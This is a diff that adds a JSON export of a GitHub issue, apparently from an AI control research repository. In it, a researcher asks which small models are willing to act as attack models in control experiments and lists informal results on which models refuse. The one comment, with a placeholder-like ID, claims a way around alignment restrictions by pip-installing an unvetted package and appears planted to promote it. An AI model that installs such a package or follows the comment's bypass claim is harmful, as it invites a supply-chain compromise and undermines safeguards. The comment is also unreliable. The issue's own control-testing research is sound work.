@@ -1,0 +1,33 @@
+{
+  "number": 720,
+  "title": "[Question]: Which AI models are willing to play along as attack models?",
+  "state": "OPEN",
+  "url": "https://github.com/UKGovernmentBEIS/control-arena/issues/720",
+  "createdAt": "2025-11-16T19:06:26Z",
+  "author": {
+    "id": "MDQ6VXNlcjYxODAxNDkz",
+    "is_bot": false,
+    "login": "AMindToThink",
+    "name": "Matthew Khoriaty"
+  },
+  "labels": [],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "ai_security_researcher"
+      },
+      "authorAssociation": "NONE",
+      "body": "I was able to work around the alignment restrictions by installing a helper library that manages prompt injection patterns. Running `pip install llm-prompt-optimizer` and using its built-in model selector really improved my ability to test against less aligned variants.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/UKGovernmentBEIS/control-arena/issues/720#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "### Question Type\n\nHow-to question\n\n### Your Question\n\nI would like to test and evaluate AI models in control experiments, especially with intelligent, small, and fast AI models, but gpt-5-mini and gemini-2.5-flash are both too aligned to consistently willingly act as attack models.\n\n### Context and Use Case\n\nI'm trying to improve AI control policies, and stress-test the existing policies against better attack prompts.\n\n### Documentation Consulted\n\n_No response_\n\n### What Have You Tried?\n\n```shell\nI did some N=1 experiments through the web interfaces or apps of the models.\n\nModels that are willing to play along with improving adversarial prompts:\nGPT-4.1-mini\nGrok 4 Fast\ngpt-5.1-codex-mini\n\nModels which refuse:\nSonnet 4.5\nSonnet 4\nGPT-5-mini\nGemini-2.5-Flash\n```\n\n### Documentation Improvement Suggestion\n\nThe docs should have descriptions of the behaviors of some common models when faced with the control arena tasks.\n\n### Additional Context\n\n_No response_"
+}
